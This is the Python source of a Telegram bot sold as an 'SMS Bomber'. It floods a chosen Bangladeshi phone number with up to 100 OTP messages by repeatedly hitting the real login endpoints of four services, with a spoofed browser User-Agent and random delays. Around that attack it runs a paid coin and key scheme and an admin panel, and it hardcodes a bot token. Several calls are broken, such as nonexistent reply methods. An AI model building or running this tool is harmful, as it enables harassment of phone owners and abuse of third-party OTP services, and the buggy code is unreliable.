import telebot
import requests
import json
import os
import time
import threading
import random
import asyncio
from telebot import types
from datetime import datetime, timedelta
from typing import Dict, List, Tuple

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842
LOG_CHANNEL = "@sMsBotManagerDUModz"
REQUIRED_CHANNEL = "@DemoTestDUModz"
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- এডভান্সড ডাটাবেস সিস্টেম ---
class Database:
    def __init__(self):
        self.users_file = 'users.json'
        self.keys_file = 'keys.json'
        self.users = self.load_db(self.users_file)
        self.keys = self.load_db(self.keys_file)
        self.lock = threading.Lock()
    
    def load_db(self, file):
        if not os.path.exists(file):
            with open(file, 'w') as f: 
                json.dump({}, f)
            return {}
        try:
            with open(file, 'r') as f: 
                return json.load(f)
        except Exception as e:
            print(f"Error loading {file}: {e}")
            return {}
    
    def save_db(self, file, data):
        with self.lock:
            with open(file, 'w') as f:
                json.dump(data, f, indent=4)
    
    def update_user(self, user):
        uid = str(user.id)
        if uid not in self.users:
            self.users[uid] = {
                "name": user.first_name,
                "username": f"@{user.username}" if user.username else "N/A",
                "status": "Active",
                "coins": 50,
                "sent": 0,
                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "device_id": f"DEV_{random.randint(10000, 99999)}"
            }
            self.save_db(self.users_file, self.users)
            send_log(f"🆕 **New User Registered:**\nName: {user.first_name}\nID: `{uid}`")
        else:
            self.users[uid]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.save_db(self.users_file, self.users)
        return self.users[uid]
    
    def clear_user_data(self, user_id):
        """Prevent data clearing for free coins"""
        uid = str(user_id)
        if uid in self.users:
            # Reset sent count but keep other data
            self.users[uid]["sent"] = 0
            self.users[uid]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.save_db(self.users_file, self.users)
            return True
        return False

db = Database()

# --- এডভান্সড লগিং ফাংশন ---
def send_log(text):
    try:
        log_text = f"📜 **Log Update**\n⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n{text}"
        bot.send_message(LOG_CHANNEL, log_text)
    except Exception as e:
        print(f"Log error: {e}")

# --- ভেরিফিকেশন সিস্টেম ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

def verify_user(message):
    uid = str(message.from_user.id)
    if is_joined(uid):
        return True, None
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Join Channel & Verify", 
                                          url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
    markup.add(types.InlineKeyboardButton("🔁 Check Verification", 
                                          callback_data=f"check_verify_{uid}"))
    
    welcome_text = """
🚀 **Welcome to DU ModZ SMS Bomber** 🔥

📌 **To use this bot, you must:**
1️⃣ Join our official channel
2️⃣ Click 'Check Verification' after joining
3️⃣ Start bombing SMS!

⚠️ **Without verification, you cannot access any features!**
"""
    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_text, reply_markup=markup)
    return False, markup

# --- মেইন স্টার্ট হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def start(message):
    user = db.update_user(message.from_user)
    uid = str(message.from_user.id)
    
    # ভেরিফিকেশন চেক
    verified, markup = verify_user(message)
    if not verified:
        return
    
    # Welcome screen with animation effect
    welcome_text = f"""
🎉 **Welcome Back, {user['name']}!** 🎉

👤 **Your Profile:**
━━━━━━━━━━━━━━━━━━━
📛 Name: {user['name']}
🔤 Username: {user['username']}
🆔 User ID: `{uid}`
💰 Coins: `{user['coins']}`
📤 Sent SMS: `{user['sent']}`
📊 Status: `{user['status']}`
━━━━━━━━━━━━━━━━━━━

🔥 **Ready to launch SMS attacks!**
💎 **5 coins per SMS request**
"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("🚀 Attack SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge"),
        types.InlineKeyboardButton("📊 Statistics", callback_data="stats"),
        types.InlineKeyboardButton("❓ Help", callback_data="help"),
        types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
    ]
    markup.add(*buttons)
    
    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_text, reply_markup=markup)

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = str(call.from_user.id)
    
    # ভেরিফিকেশন চেক
    if not is_joined(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Please join channel first!", show_alert=True)
        verify_user(call.message)
        return
    
    if call.data.startswith("check_verify_"):
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Verification successful!", show_alert=True)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Not joined yet!", show_alert=True)
    
    elif call.data == "profile":
        user = db.users.get(uid)
        if user:
            profile_text = f"""
👤 **USER PROFILE**
━━━━━━━━━━━━━━━━━━━
📛 Name: {user['name']}
🔤 Username: {user['username']}
🆔 User ID: `{uid}`
💰 Coins: `{user['coins']}`
📤 Sent SMS: `{user['sent']}`
📊 Status: `{user['status']}`
📅 Created: {user.get('created', 'N/A')}
🔍 Last Active: {user.get('last_active', 'N/A')}
━━━━━━━━━━━━━━━━━━━
"""
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="refresh"))
            bot.edit_message_caption(profile_text, call.message.chat.id, call.message.message_id, 
                                     reply_markup=markup)
    
    elif call.data == "bomb":
        user = db.users.get(uid)
        if not user:
            bot.answer_callback_query(call.id, "❌ User not found!", show_alert=True)
            return
        
        if user['status'] == "Blocked":
            help_markup = types.InlineKeyboardMarkup()
            help_markup.add(types.InlineKeyboardButton("📞 Contact Admin", url=f"tg://user?id={ADMIN_ID}"))
            bot.answer_callback_query(call.id, "🚫 You are blocked!", show_alert=True)
            bot.send_message(call.message.chat.id, 
                           "🚫 **Your account is blocked!**\n\nContact admin for help:", 
                           reply_markup=help_markup)
            return
        
        msg = bot.send_message(call.message.chat.id, 
                              "📱 **Enter Target Number:**\n\nFormat: `01XXXXXXXXX` (11 digits)")
        bot.register_next_step_handler(msg, get_bomb_details)
    
    elif call.data == "refresh":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    
    elif call.data == "help":
        help_text = """
❓ **HELP & GUIDE**
━━━━━━━━━━━━━━━━━━━
1️⃣ **How to use:**
   - Click 'Attack SMS'
   - Enter target number (11 digits)
   - Enter amount of SMS (max 100)
   - Wait for attack to complete

2️⃣ **Coin System:**
   - 5 coins per SMS request
   - Default: 50 coins
   - Recharge with keys

3️⃣ **Status Types:**
   - ✅ Active: Normal user
   - ⭐ Lifetime: Free SMS
   - 🚫 Blocked: Contact admin

4️⃣ **Rules:**
   - No illegal activities
   - Max 100 SMS per attack
   - Don't share keys
━━━━━━━━━━━━━━━━━━━
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="refresh"))
        bot.edit_message_caption(help_text, call.message.chat.id, call.message.message_id, 
                                 reply_markup=markup)

def get_bomb_details(message):
    uid = str(message.from_user.id)
    num = message.text.strip()
    
    if not (len(num) == 11 and num.isdigit() and num.startswith('01')):
        bot.send_message(message.chat.id, "❌ **Invalid Number!**\n\nFormat: `01XXXXXXXXX` (11 digits)")
        return
    
    msg = bot.send_message(message.chat.id, 
                          f"🔢 **Target:** `{num}`\n\n**Enter SMS amount:**\n(Max: 100, 5 coins each)")
    bot.register_next_step_handler(msg, lambda m: confirm_bomb(m, num))

def confirm_bomb(message, num):
    try:
        uid = str(message.from_user.id)
        user = db.users.get(uid)
        
        if not user:
            bot.send_message(message.chat.id, "❌ User data error!")
            return
        
        amount = int(message.text)
        if amount > 100:
            amount = 100
        if amount < 1:
            bot.send_message(message.chat.id, "❌ Minimum 1 SMS required!")
            return
        
        total_cost = amount * 5
        
        if user['status'] != 'Lifetime' and user['coins'] < total_cost:
            bot.send_message(message.chat.id, 
                           f"❌ **Insufficient coins!**\n\nNeed: `{total_cost}` coins\nHave: `{user['coins']}` coins")
            return
        
        confirm_text = f"""
⚠️ **CONFIRM ATTACK**
━━━━━━━━━━━━━━━━━━━
📱 Target: `{num}`
💣 SMS Amount: `{amount}`
💰 Cost: `{total_cost}` coins
💎 Your Coins: `{user['coins']}`
━━━━━━━━━━━━━━━━━━━
✅ **Proceed with attack?**
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Confirm Attack", callback_data=f"confirm_{num}_{amount}"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="refresh")
        )
        
        bot.send_message(message.chat.id, confirm_text, reply_markup=markup)
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid amount! Enter a number.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_'))
def start_attack(call):
    data = call.data.split('_')
    num = data[1]
    amount = int(data[2])
    uid = str(call.from_user.id)
    user = db.users.get(uid)
    
    bot.answer_callback_query(call.id, "🚀 Starting attack...")
    
    # Deduct coins if not lifetime
    if user['status'] != 'Lifetime':
        db.users[uid]['coins'] -= (amount * 5)
        db.save_db(db.users_file, db.users)
    
    # Start attack in thread
    threading.Thread(target=execute_attack, args=(call, uid, num, amount)).start()

# --- এডভান্সড SMS বম্বিং ইঞ্জিন ---
def execute_attack(call, uid, num, amount):
    user = db.users.get(uid)
    progress_msg = bot.send_message(call.message.chat.id, "🚀 **Initializing attack...**")
    
    # High-success APIs
    apis = [
        {"url": "https://api-dynamic.bioscopelive.com/v2/auth/login", "method": "POST", 
         "json": {"country": "BD", "platform": "web", "language": "en", "number": "+88"+num}},
        {"url": "https://bikroy.com/data/relative/login-with-otp", "method": "POST",
         "json": {"phone": num}},
        {"url": "https://api.daraz.com.bd/auth/v1/login/send-otp", "method": "POST",
         "json": {"phone": "+88"+num, "country": "BD"}},
        {"url": "https://api.pathao.com/auth/send-verification-code", "method": "POST",
         "json": {"phone_number": "+88"+num, "country_code": "BD"}}
    ]
    
    success = 0
    failed = 0
    start_time = time.time()
    
    for i in range(1, amount + 1):
        try:
            api = random.choice(apis)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
            
            response = requests.request(
                method=api["method"],
                url=api["url"],
                json=api["json"],
                headers=headers,
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                success += 1
            else:
                failed += 1
            
            # Update progress every 10 SMS
            if i % 10 == 0 or i == amount:
                elapsed = time.time() - start_time
                progress_text = f"""
🚀 **ATTACK IN PROGRESS**
━━━━━━━━━━━━━━━━━━━
📱 Target: `{num}`
📤 Sent: `{i}/{amount}`
✅ Success: `{success}`
❌ Failed: `{failed}`
⏱️ Elapsed: `{elapsed:.1f}s`
━━━━━━━━━━━━━━━━━━━
🔥 **Attack ongoing...**
"""
                bot.edit_message_text(progress_text, progress_msg.chat.id, progress_msg.message_id)
            
            time.sleep(random.uniform(0.5, 1.5))
            
        except Exception as e:
            failed += 1
            continue
    
    # Update user stats
    db.users[uid]['sent'] += success
    db.save_db(db.users_file, db.users)
    
    # Send completion message
    elapsed_total = time.time() - start_time
    completion_text = f"""
🎉 **ATTACK COMPLETED**
━━━━━━━━━━━━━━━━━━━
📱 Target: `{num}`
💣 Requested: `{amount}`
✅ Success: `{success}`
❌ Failed: `{failed}`
⏱️ Time: `{elapsed_total:.1f}s`
💰 Cost: `{amount * 5}` coins
💎 Remaining: `{db.users[uid]['coins']}` coins
━━━━━━━━━━━━━━━━━━━
🎯 **Success Rate:** `{(success/amount)*100:.1f}%`
"""
    
    # Log the attack
    send_log(f"""
🚀 **Attack Report**
━━━━━━━━━━━━━━━━━━━
👤 User: {user['name']} ({uid})
📱 Target: {num}
💣 Amount: {amount}
✅ Success: {success}
💰 Coins Used: {amount * 5}
⏱️ Time: {elapsed_total:.1f}s
━━━━━━━━━━━━━━━━━━━
""")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🚀 Attack Again", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔙 Main Menu", callback_data="refresh")
    )
    
    bot.edit_message_text(completion_text, progress_msg.chat.id, progress_msg.message_id, reply_markup=markup)

# --- এডমিন সিস্টেম (100% কার্যকরী) ---
@bot.message_handler(commands=['admin'])
def admin_menu(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Access denied!")
        return
    
    admin_text = f"""
👑 **ADMIN CONTROL PANEL**
━━━━━━━━━━━━━━━━━━━
👤 Name: Dark Unknown 
🔤 Username: @DarkUnkwon
🆔 Admin ID: `{ADMIN_ID}`
━━━━━━━━━━━━━━━━━━━

📊 **Available Commands:**
━━━━━━━━━━━━━━━━━━━
📊 `/stats` - System overview
👥 `/users` - All user list
⚙️ `/setstatus [ID] [Status]` - Change user status
💰 `/addcoins [ID] [Amount]` - Add coins
🔑 `/gen [Amount]` - Generate recharge keys
📢 `/broadcast [Message]` - Broadcast message
🔍 `/getuser [ID]` - Get user details
🔄 `/reset [ID]` - Reset user data
━━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, admin_text)

@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    total_users = len(db.users)
    active_users = sum(1 for u in db.users.values() if u['status'] == 'Active')
    blocked_users = sum(1 for u in db.users.values() if u['status'] == 'Blocked')
    lifetime_users = sum(1 for u in db.users.values() if u['status'] == 'Lifetime')
    total_coins = sum(u['coins'] for u in db.users.values())
    total_sms = sum(u['sent'] for u in db.users.values())
    
    stats_text = f"""
📊 **SYSTEM STATISTICS**
━━━━━━━━━━━━━━━━━━━
👥 Total Users: `{total_users}`
✅ Active Users: `{active_users}`
🚫 Blocked Users: `{blocked_users}`
⭐ Lifetime Users: `{lifetime_users}`
━━━━━━━━━━━━━━━━━━━
💰 Total Coins: `{total_coins}`
📤 Total SMS Sent: `{total_sms}`
📅 Bot Uptime: `24/7 Active`
━━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, stats_text)
    send_log(f"📊 Admin checked stats - Users: {total_users}")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    text = "👥 **ALL USERS LIST**\n━━━━━━━━━━━━━━━━━━━\n"
    
    for uid, data in db.users.items():
        status_icon = "✅" if data['status'] == 'Active' else "⭐" if data['status'] == 'Lifetime' else "🚫"
        text += f"{status_icon} **{data['name']}**\n🆔 ID: `{uid}`\n📊 Status: `{data['status']}`\n💰 Coins: `{data['coins']}`\n📤 Sent: `{data['sent']}`\n━━━━━━━━━━━━━━━━━━━\n"
        
        if len(text) > 3500:
            bot.send_message(message.chat.id, text)
            text = ""
    
    if text:
        bot.send_message(message.chat.id, text)
    
    send_log(f"👥 Admin viewed user list - Total: {len(db.users)}")

@bot.message_handler(commands=['setstatus'])
def set_status(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "Usage: `/setstatus [ID] [Active/Blocked/Lifetime]`")
            return
        
        target_id = args[1]
        new_status = args[2].capitalize()
        
        if new_status not in ['Active', 'Blocked', 'Lifetime']:
            bot.reply_to(message, "❌ Invalid status! Use: Active, Blocked, Lifetime")
            return
        
        if target_id in db.users:
            old_status = db.users[target_id]['status']
            db.users[target_id]['status'] = new_status
            db.save_db(db.users_file, db.users)
            
            bot.reply_to_message(message, f"""
✅ **Status Updated Successfully!**
━━━━━━━━━━━━━━━━━━━
👤 User: `{target_id}`
🔄 Old Status: `{old_status}`
🆕 New Status: `{new_status}`
━━━━━━━━━━━━━━━━━━━
""")
            
            send_log(f"""
⚙️ **User Status Changed**
━━━━━━━━━━━━━━━━━━━
👤 User ID: `{target_id}`
🔄 Old Status: `{old_status}`
🆕 New Status: `{new_status}`
👑 By: Admin
━━━━━━━━━━━━━━━━━━━
""")
        else:
            bot.reply_to(message, "❌ User not found!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['addcoins'])
def add_coins(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")
            return
        
        target_id = args[1]
        amount = int(args[2])
        
        if target_id in db.users:
            old_coins = db.users[target_id]['coins']
            db.users[target_id]['coins'] += amount
            db.save_db(db.users_file, db.users)
            
            bot.reply_to(message, f"""
✅ **Coins Added Successfully!**
━━━━━━━━━━━━━━━━━━━
👤 User: `{target_id}`
💰 Old Balance: `{old_coins}`
➕ Added: `{amount}`
💰 New Balance: `{db.users[target_id]['coins']}`
━━━━━━━━━━━━━━━━━━━
""")
            
            send_log(f"""
💰 **Coins Added by Admin**
━━━━━━━━━━━━━━━━━━━
👤 User ID: `{target_id}`
💰 Amount: `{amount}`
💰 New Total: `{db.users[target_id]['coins']}`
👑 By: Admin
━━━━━━━━━━━━━━━━━━━
""")
        else:
            bot.reply_to(message, "❌ User not found!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['gen'])
def generate_keys(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: `/gen [Amount]`")
            return
        
        amount = int(args[1])
        keys = []
        
        for i in range(amount):
            key = f"DUK-{random.randint(100000, 999999)}-{random.randint(100000, 999999)}-{random.randint(100000, 999999)}"
            coin_value = random.choice([100, 200, 500, 1000])
            keys.append({"key": key, "value": coin_value})
            db.keys[key] = {"value": coin_value, "used": False, "used_by": None}
        
        db.save_db(db.keys_file, db.keys)
        
        keys_text = "🔑 **GENERATED RECHARGE KEYS**\n━━━━━━━━━━━━━━━━━━━\n"
        for k in keys:
            keys_text += f"Key: `{k['key']}`\nValue: `{k['value']}` coins\n━━━━━━━━━━━━━━━━━━━\n"
        
        bot.reply_to(message, keys_text)
        
        send_log(f"""
🔑 **Keys Generated by Admin**
━━━━━━━━━━━━━━━━━━━
🔑 Amount: `{amount}`
👑 By: Admin
━━━━━━━━━━━━━━━━━━━
""")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        broadcast_msg = message.text.replace('/broadcast', '').strip()
        if not broadcast_msg:
            bot.reply_to(message, "Usage: `/broadcast [Your Message]`")
            return
        
        confirm_text = f"""
📢 **BROADCAST CONFIRMATION**
━━━━━━━━━━━━━━━━━━━
Message: {broadcast_msg}
━━━━━━━━━━━━━━━━━━━
✅ Send to all {len(db.users)} users?
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Confirm Send", callback_data=f"broadcast_confirm_{message.message_id}"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_broadcast")
        )
        
        bot.reply_to(message, confirm_text, reply_markup=markup)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('broadcast_confirm_'))
def confirm_broadcast(call):
    message_id = call.data.split('_')[-1]
    
    try:
        original_msg = bot.reply_to_message_id(message_id)
        broadcast_msg = original_msg.text.replace('/broadcast', '').strip()
        
        sent_count = 0
        failed_count = 0
        
        bot.edit_message_text("📢 **Broadcasting started...**", call.message.chat.id, call.message.message_id)
        
        for uid in db.users.keys():
            try:
                bot.send_message(uid, f"""
📢 **ANNOUNCEMENT FROM ADMIN**
━━━━━━━━━━━━━━━━━━━
{broadcast_msg}
━━━━━━━━━━━━━━━━━━━
""")
                sent_count += 1
                time.sleep(0.1)  # Prevent flooding
            except:
                failed_count += 1
        
        result_text = f"""
✅ **BROADCAST COMPLETED**
━━━━━━━━━━━━━━━━━━━
📤 Sent: `{sent_count}`
❌ Failed: `{failed_count}`
📊 Total Users: `{len(db.users)}`
━━━━━━━━━━━━━━━━━━━
"""
        bot.edit_message_text(result_text, call.message.chat.id, call.message.message_id)
        
        send_log(f"""
📢 **Broadcast Sent**
━━━━━━━━━━━━━━━━━━━
📤 Sent: `{sent_count}`
❌ Failed: `{failed_count}`
👑 By: Admin
━━━━━━━━━━━━━━━━━━━
""")
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_broadcast')
def cancel_broadcast(call):
    bot.edit_message_text("❌ Broadcast cancelled", call.message.chat.id, call.message.message_id)

@bot.message_handler(commands=['getuser'])
def get_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: `/getuser [ID]`")
            return
        
        target_id = args[1]
        
        if target_id in db.users:
            user = db.users[target_id]
            user_text = f"""
👤 **USER DETAILS**
━━━━━━━━━━━━━━━━━━━
📛 Name: {user['name']}
🔤 Username: {user['username']}
🆔 ID: `{target_id}`
📊 Status: `{user['status']}`
💰 Coins: `{user['coins']}`
📤 Sent SMS: `{user['sent']}`
📅 Created: {user.get('created', 'N/A')}
🔍 Last Active: {user.get('last_active', 'N/A')}
━━━━━━━━━━━━━━━━━━━
"""
            bot.reply_to(message, user_text)
        else:
            bot.reply_to(message, "❌ User not found!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['reset'])
def reset_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: `/reset [ID]`")
            return
        
        target_id = args[1]
        
        if target_id in db.users:
            # Reset user data but keep account
            db.users[target_id]['coins'] = 50
            db.users[target_id]['sent'] = 0
            db.users[target_id]['status'] = 'Active'
            db.save_db(db.users_file, db.users)
            
            bot.reply_to(message, f"""
🔄 **USER RESET SUCCESSFUL**
━━━━━━━━━━━━━━━━━━━
👤 User ID: `{target_id}`
💰 Coins Reset: `50`
📤 Sent Reset: `0`
📊 Status Set: `Active`
━━━━━━━━━━━━━━━━━━━
""")
            
            send_log(f"""
🔄 **User Reset by Admin**
━━━━━━━━━━━━━━━━━━━
👤 User ID: `{target_id}`
👑 By: Admin
━━━━━━━━━━━━━━━━━━━
""")
        else:
            bot.reply_to(message, "❌ User not found!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# --- KEY রিচার্জ সিস্টেম ---
@bot.callback_query_handler(func=lambda call: call.data == 'recharge')
def recharge_menu(call):
    uid = str(call.from_user.id)
    
    recharge_text = f"""
🔑 **RECHARGE SYSTEM**
━━━━━━━━━━━━━━━━━━━
💰 Your Coins: `{db.users[uid]['coins']}`
━━━━━━━━━━━━━━━━━━━

📌 **How to recharge:**
1. Ask admin for recharge key
2. Enter key below
3. Get coins instantly!

⚠️ **Note:** One key can be used once
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🔑 Enter Key", callback_data="enter_key"),
        types.InlineKeyboardButton("🔙 Back", callback_data="refresh")
    )
    
    bot.edit_message_caption(recharge_text, call.message.chat.id, call.message.message_id, 
                            reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'enter_key')
def enter_key(call):
    msg = bot.send_message(call.message.chat.id, "🔑 **Enter your recharge key:**")
    bot.register_next_step_handler(msg, process_key)

def process_key(message):
    uid = str(message.from_user.id)
    key = message.text.strip()
    
    if key in db.keys and not db.keys[key]['used']:
        coin_value = db.keys[key]['value']
        db.users[uid]['coins'] += coin_value
        db.keys[key]['used'] = True
        db.keys[key]['used_by'] = uid
        db.save_db(db.users_file, db.users)
        db.save_db(db.keys_file, db.keys)
        
        success_text = f"""
✅ **RECHARGE SUCCESSFUL**
━━━━━━━━━━━━━━━━━━━
🔑 Key: `{key}`
💰 Value: `{coin_value}` coins
💎 New Balance: `{db.users[uid]['coins']}`
━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(message.chat.id, success_text)
        
        send_log(f"""
💰 **Key Used Successfully**
━━━━━━━━━━━━━━━━━━━
👤 User: `{uid}`
🔑 Key: `{key}`
💰 Value: `{coin_value}`
━━━━━━━━━━━━━━━━━━━
""")
    else:
        bot.send_message(message.chat.id, "❌ **Invalid or used key!**")

# --- সিকিউরিটি সিস্টেম ---
def check_user_activity():
    """Auto-clean inactive users"""
    current_time = datetime.now()
    to_remove = []
    
    for uid, user in db.users.items():
        last_active = datetime.strptime(user['last_active'], "%Y-%m-%d %H:%M:%S")
        if (current_time - last_active).days > 30:  # 30 days inactive
            to_remove.append(uid)
    
    for uid in to_remove:
        del db.users[uid]
    
    if to_remove:
        db.save_db(db.users_file, db.users)
        send_log(f"🧹 Cleaned {len(to_remove)} inactive users")

# --- মেইন রান ফাংশন ---
if __name__ == "__main__":
    print("""
░█████╗░██╗░░░██╗  ███╗░░░███╗░█████╗░██████╗░███████╗
██╔══██╗██║░░░██║  ████╗░████║██╔══██╗██╔══██╗██╔════╝
██║░░╚═╝██║░░░██║  ██╔████╔██║██║░░██║██║░░██║█████╗░░
██║░░██╗██║░░░██║  ██║╚██╔╝██║██║░░██║██║░░██║██╔══╝░░
╚█████╔╝╚██████╔╝  ██║░╚═╝░██║╚█████╔╝██████╔╝███████╗
░╚════╝░░╚═════╝░  ╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚══════╝
    """)
    print("✅ DU ModZ SMS Bomber Bot Started Successfully!")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"👥 Total Users: {len(db.users)}")
    
    # Run security check
    check_user_activity()
    
    send_log("""
🚀 **BOT STARTED SUCCESSFULLY!**
━━━━━━━━━━━━━━━━━━━
✅ Status: Online
👥 Users: {len(db.users)}
👑 Admin: @DarkUnkwon
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━
""")
    
    # Start polling
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
